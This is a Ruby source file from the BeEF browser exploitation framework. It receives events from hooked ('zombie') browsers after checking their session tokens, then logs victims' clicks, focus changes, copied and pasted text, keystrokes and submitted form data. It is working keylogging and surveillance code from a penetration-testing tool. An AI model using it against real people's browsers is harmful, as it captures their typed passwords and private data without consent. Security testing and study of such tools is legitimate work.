#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
module Extension
module Events
    
  #
  # The http handler that manages the Events.
  #
  class Handler

    Z = BeEF::Core::Models::HookedBrowser

    def initialize(data)
      @data = data
      setup()
    end

    #
    # Sets up event logging
    #
    def setup()
      
      # validates the hook token
      beef_hook = @data['beefhook'] || nil 
      if beef_hook.nil?
        print_error "[EVENTS] beef_hook is null"
        return
      end

      # validates that a hooked browser with the beef_hook token exists in the db
      zombie = Z.first(:session => beef_hook) || nil
      if zombie.nil?
        print_error "[EVENTS] Invalid beef hook id: the hooked browser cannot be found in the database"
        return
      end
     
      events = @data['results']

      # push events to logger
        logger = BeEF::Core::Logger.instance
        events.each do |key,value|
            logger.register('Event', parse(value), zombie.id)
        end
    end

    def parse(event)
      case event['type']
        when 'click'
          result = "#{event['time']}s - [Mouse Click] x: #{event['x']} y:#{event['y']} > #{event['target']}"
        when 'focus'
          result = "#{event['time']}s - [Focus] Browser window has regained focus."
        when 'copy'
          result = "#{event['time']}s - [User Copied Text] \"#{event['data']}\""
        when 'cut'
          result = "#{event['time']}s - [User Cut Text] \"#{event['data']}\""
        when 'paste'
          result = "#{event['time']}s - [User Pasted Text] \"#{event['data']}\""
        when 'blur'
          result = "#{event['time']}s - [Blur] Browser window has lost focus."
        when 'keys'
          result = "#{event['time']}s - [User Typed] \"#{event['data']}\" > #{event['target']}"
        when 'submit'
          result = "#{event['time']}s - [Form Submitted] \"#{event['data']}\" > #{event['target']}"
        else
          print_debug '[EVENTS] Event handler has received an unknown event'
          result = "#{event['time']}s - Unknown event"
      end
      result
    end
    
  end
  
end
end
end
